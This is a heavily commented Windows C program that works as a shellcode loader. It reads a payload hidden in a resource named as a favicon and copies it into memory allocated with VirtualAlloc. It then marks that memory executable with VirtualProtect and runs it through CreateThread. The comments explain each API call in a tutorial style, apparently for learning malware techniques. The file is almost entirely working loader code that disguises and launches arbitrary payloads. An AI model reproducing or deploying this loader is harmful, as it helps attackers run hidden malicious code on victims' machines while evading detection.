#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"

int main() {
	void *memory_that_is_executable;
	BOOL section_flag;
	DWORD previous_protected = 0;
	HGLOBAL resource_handle = NULL;
	HRSRC resource;
	HANDLE hThread;

	char* payload;
	unsigned int payload_len;


	// arguments of FindResource:
	// HMODULE - handle to the module file whose PE file or MUI file contains the resource.
	// If it's set to NULL, the function will use the module that creates the current process.
	// lpName - Name of the resource. You can also use MAKEINTRESOURCE to convert an integer to resource file
	// you input the id of the resource
	// lpType - the resource type. You can pass one of the standart resource types.
	// in our case we pass RT_RCDATA for raw data
	// FindResource function will return a handle to the required resource.
	// To load the resource, pass the handle to the LoadResource Function.
	resource = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	
	/// <summary>
	/// the function returns a handle to the resource that can be used to obtain a pointer to the beginning of the resource file
	/// </summary>
	/// HMODULE - handle to the module that contains the resource
	/// hResInfo - handle to the resource that is returned by FindResource function
	/// <returns></returns>
	resource_handle = LoadResource(NULL, resource);

	/// <summary>
	/// Retrieves a pointer to the beginning of a resource file
	/// </summary>
	/// hResData - handle to the resource to be obtained. It is the return value of LoadResource function.
	/// <returns></returns>
	payload = (char *)LockResource(resource_handle);
	
	// returns size of a resource in bytes
	// HMODULE - handle to the module that contains the resource. if null, it searches for the resource inside the module that created the process
	// hResInfo - a handle to the resource
	payload_len = SizeofResource(NULL, resource);

	// Allocates memory inside the current process.
	// lpAddress - the starting address of the region to allocate. if set to null, system itself decides an address
	// dwSize - size of the region to be allocated
	// flAllocationType - type of memory allocation. 
	// flProtect - memory protection for the region
	memory_that_is_executable = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// shift the payload to the memory allocated
	RtlMoveMemory(memory_that_is_executable, payload, payload_len);
	
	/// <summary>
	/// Changes the protection of the passed memory region
	/// </summary>
	/// the last argument is the pointer to the variable that will store the previous protection value of the region
	/// <returns>if it suceeds, it will return nonzero value. If it fails, it returns 0.</returns>
	section_flag = VirtualProtect(memory_that_is_executable, payload_len, PAGE_EXECUTE_READ, &previous_protected);

	if (section_flag != 0) {
		/// <summary>
		/// To create thread that executes within the region of the current process
		/// </summary>
		/// lpThreadAttribute - if set to null, this means a child cannot inherit the handle
		/// dwStackSize - size of the thread stack. if set to zero, it will get default size for an executable
		/// lpStartAddress - a pointer to the memory region to be executed by the thread
		/// lpParameter - a pointer to a variable to be passed to the thread
		/// dwCreationFlags - flags regarding the state of the state. pass 0 to start immediately
		/// lpThreadIdentifier - pointer to the variable that receives thread identifier. if set to null, th. id. not returned
		/// <returns>if suceeds, the value is handle to the thread. if fails, it returns NULL</returns>
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memory_that_is_executable, 0, 0, NULL);
		
		/// <summary>
		/// wait until an object in the signaled state
		/// </summary>
		/// <returns></returns>
		WaitForSingleObject(hThread, -1);
	}

}
